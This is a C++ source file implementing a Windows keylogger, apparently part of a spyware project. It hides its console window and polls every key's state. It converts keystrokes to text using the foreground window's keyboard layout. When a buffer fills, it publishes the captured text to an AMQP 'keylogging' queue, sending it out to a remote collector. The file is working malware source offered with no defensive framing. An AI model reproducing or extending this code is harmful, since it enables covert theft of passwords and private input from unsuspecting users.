#include <string>
#include <stdlib.h>
#include <locale>
#include <codecvt>

#if defined(_WIN64) || defined(_WIN32)
#include <windows.h>
#include <winuser.h>
#endif

#include "keylogger.hpp"
#include "../core/debug.hpp"

// TODO : Maybe add linux support

/* Windows specifique functionaly*/
#if defined(_WIN64) || defined(_WIN32)
bool WinHandleKeyStroke (std::wstring &, int);
void WinScannedKeyTranslate (std::wstring &, int);

void startKeylogger(AmqpClient &amqpClient) {
    std::wstring keyStrokeBuffer;
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;

    // Open a hidden window
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    while ( true ) {
        Sleep(10);

        for (int KEY = 8; KEY <= 222; KEY++) {
            bool mustBreak = WinHandleKeyStroke(keyStrokeBuffer, KEY);
            if (mustBreak) break;
        }
        
        if (keyStrokeBuffer.length() >= _SPYWARE_KEYLOG_BUFFER_MAX_) {
            std::string logs = converter.to_bytes(keyStrokeBuffer);
            amqpClient.basicPublish("", "keylogging", logs);
            keyStrokeBuffer.clear();
        }
    }
}

bool WinHandleKeyStroke (std::wstring &input, int scannedKey) {
    if ( GetAsyncKeyState(scannedKey) != -32767) return false;

    if (scannedKey >= 39 && scannedKey < 91) {
        WinScannedKeyTranslate(input, scannedKey);
    }

    return true;
}

void WinScannedKeyTranslate (std::wstring &input, int scannedKey) {
    wchar_t uniChar [16] = {0};

    HKL hkl;
    DWORD fgProcessId; 
    UINT virtualKey;
    BYTE *kState = (BYTE *)malloc(256);
    HWND hWindowHandle = GetForegroundWindow(); // Get reference to the foreground windows
    DWORD fgThreadId = GetWindowThreadProcessId(hWindowHandle, &fgProcessId); // Get threadId of the forground window
    
    GetKeyboardState(kState);
    hkl = GetKeyboardLayout(fgThreadId); // Get Keyboard layout of the foreground window
    virtualKey = MapVirtualKeyEx((UINT)scannedKey, MAPVK_VK_TO_CHAR, hkl); // Get Virtual key of the scanned key
    ToUnicodeEx(virtualKey, (UINT)scannedKey, kState, uniChar, 16, 0, hkl);

    input += std::wstring(uniChar);

    free(kState);
}
#endif